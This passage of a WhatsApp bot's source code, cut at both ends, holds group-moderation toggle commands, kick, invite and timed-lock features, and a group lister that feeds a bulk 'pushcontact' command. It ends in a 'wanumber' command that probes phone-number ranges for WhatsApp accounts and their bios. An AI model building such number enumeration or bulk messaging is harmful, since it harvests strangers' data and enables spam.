           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antimedia':{
		         if (!m.isGroup) return LorenzoStickGroup()
if (!isBotAdmins) return LorenzoStickBotAdmin()
if (!isAdmins && !isCreator) return LorenzoStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antimedia = true
                  newReply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antimedia = false
                  newReply(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antidocument':{
		         if (!m.isGroup) return LorenzoStickGroup()
if (!isBotAdmins) return LorenzoStickBotAdmin()
if (!isAdmins && !isCreator) return LorenzoStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antidocument = true
                  newReply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antidocument = false
                  newReply(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anticontact':{
		         if (!m.isGroup) return LorenzoStickGroup()
if (!isBotAdmins) return LorenzoStickBotAdmin()
if (!isAdmins && !isCreator) return LorenzoStickAdmin()
         
               if (args[0] === 'on') {
                  db.data.chats[from].anticontact = true
                  newReply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].anticontact = false
                  newReply(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antilocation':{
		         if (!m.isGroup) return LorenzoStickGroup()
if (!isBotAdmins) return LorenzoStickBotAdmin()
if (!isAdmins && !isCreator) return LorenzoStickAdmin()
               if (args[0] === 'on') {
                  db.data.chats[from].antilocation = true
                  newReply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilocation = false
                  newReply(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
                        case 'chatbot': case 'rias-ai' : {
if (!isCreator) return ownernya()         
               if (args[0] === 'on') {
                  db.data.chats[m.chat].chatbot = true
                  newReply(`${command} is 𝐄𝐍𝐀𝐁𝐋𝐄𝐃`)
               } else if (args[0] === 'off') {
                  db.data.chats[m.chat].chatbot = false
                  newReply(`${command} is 𝐃𝐈𝐒𝐀𝐁𝐋𝐄𝐃`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":" 𝑺𝑬𝑳𝑬𝑪𝑻 𝑬𝑵𝑨𝑩𝑳𝑬/𝑫𝑰𝑺𝑨𝑩𝑳𝑬 ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"𝑬𝑵𝑨𝑩𝑳𝑬 ✅",
"title":"CHOOSE ",
"description":"𝑬𝑵𝑨𝑩𝑳𝑬 ✅",
"id":"${prefix+command} on"},
{"header":"𝑫𝑰𝑺𝑨𝑩𝑳𝑬  ❌",
"title":"CHOOSE ",
"description":"𝑫𝑰𝑺𝑨𝑩𝑳𝑬  ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
                                    case 'antidelete':{
if (!isCreator) return ownernya()
               if (args[0] === 'on') {
                  db.data.chats[from].antidelete = true
                  newReply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antidelete = false
                  newReply(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antilink': {
               if (!m.isGroup) return LorenzoStickGroup()
if (!isBotAdmins) return LorenzoStickBotAdmin()
if (!isAdmins && !isCreator) return LorenzoStickAdmin()
               if (args[0] === 'on') {
                  db.data.chats[from].antilink = true
                  newReply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilink = false
                  newReply(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'antilinkgc': {
               if (!m.isGroup) return LorenzoStickGroup()
if (!isBotAdmins) return LorenzoStickBotAdmin()
if (!isAdmins && !isCreator) return LorenzoStickAdmin()
               if (args[0] === 'on') {
                  db.data.chats[from].antilinkgc = true
                  newReply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilinkgc = false
                  newReply(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'antipromotion': {
               if (!m.isGroup) return LorenzoStickGroup()
if (!isBotAdmins) return LorenzoStickBotAdmin()
if (!isAdmins && !isCreator) return LorenzoStickAdmin()
               if (args[0] === 'on') {
                  db.data.chats[from].antipromotion = true
                  newReply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antipromotion = false
                  newReply(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'welcome':
            case 'left': {
               if (!m.isGroup) return LorenzoStickGroup()
if (!isAdmins && !isCreator) return LorenzoStickAdmin()
               if (args[0] === 'on') {
                  welcome = true
                  newReply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  welcome = false
                  newReply(`${command} is disabled`)
               }else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case "alive":

const audiovn = "./Riasisalive.mp3";
    const dooc = {
        audio: {
          url: audiovn
        },
        mimetype: 'audio/mp4',
        ptt: true,
        waveform:  [100, 0, 100, 0, 100, 0, 100],
        fileName: "",

        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
          title: "𝐈𝐬 𝐑𝐢𝐚𝐬 𝐆𝐫𝐞𝐦𝐨𝐫𝐲 𝐀𝐥𝐢𝐯𝐞? 🤭",
          body: "𝐘𝐞𝐬 𝐒𝐡𝐞 𝐈𝐬",
          thumbnailUrl: "https://i.ibb.co/yS8t5Gw/IMG-20240906-154744-545.jpg",
          sourceUrl: "https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P",
          mediaType: 1,
          renderLargerThumbnail: true
          }}
      };


await ToxxicTechInc.sendMessage(m.chat, dooc, {quoted: m});


break;
            case 'adminevent': {
               if (!m.isGroup) return LorenzoStickGroup()
if (!isAdmins && !isCreator) return LorenzoStickAdmin()
               if (args[0] === 'on') {
                  adminevent = true
                  newReply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  adminevent = false
                  newReply(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
case 'groupevent': {
               if (!m.isGroup) return LorenzoStickGroup()
if (!isAdmins && !isCreator) return LorenzoStickAdmin()
               if (args[0] === 'on') {
                  groupevent = true
                  newReply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  groupevent = false
                  newReply(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break 
            case 'invite': {
	if (!m.isGroup) return LorenzoStickGroup()
	if (!isBotAdmins) return LorenzoStickBotAdmin()
if (!text) return newReply(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 2348165846414`)
if (text.includes('+')) return newReply(`Enter the number together without *+*`)
if (isNaN(text)) return newReply(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await ToxxicTechInc.groupInviteCode(group)
      await ToxxicTechInc.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        newReply(` An invite link is sent to the user`) 
}
break
            case 'closetime':
                if (!m.isGroup) return LorenzoStickGroup()
                if (!isAdmins && !isCreator) return LorenzoStickAdmin()
                if (!isBotAdmins) return LorenzoStickBotAdmin()
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return newReply('*select:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
                }
                newReply(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Close time* group closed by admin\nnow only admin can send messages`
                    ToxxicTechInc.groupSettingUpdate(m.chat, 'announcement')
                    newReply(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return LorenzoStickGroup()
                if (!isAdmins && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return LorenzoStickBotAdmin()
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return newReply('*select:*\nsecond\nminute\nhour\n\n*example*\n10 second')
                }
                newReply(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Open time* the group was opened by admin\n now members can send messages`
                    ToxxicTechInc.groupSettingUpdate(m.chat, 'not_announcement')
                    newReply(open)
                }, timer)
                break
            case 'kick':
                if (!isAdmins && !isGroupOwner && !isCreator) return LorenzoStickAdmin()
                if (!m.isGroup) return LorenzoStickGroup()
                if (!isAdmins && !isGroupOwner && !isCreator) return LorenzoStickAdmin()
                if (!isBotAdmins) return LorenzoStickBotAdmin()
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await ToxxicTechInc.groupParticipantsUpdate(m.chat, [blockwww], 'remove')
                newReply(mess.done)
                break

                case "idgroup": case "groupid": {
if (!isCreator) return ownernya()
let getGroups = await ToxxicTechInc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *GROUP LIST BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await ToxxicTechInc.groupMetadata(x)
teks += `◉ Name : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
newReply(teks + `To Use Please Type Command ${prefix}pushcontact idgroup|teks\n\nBefore using, please first copy the group id above`)
}
break
case 'wanumber': case 'nowa': case 'searchno': case 'searchnumber':{
           	if (!text) return newReply(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        newReply(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
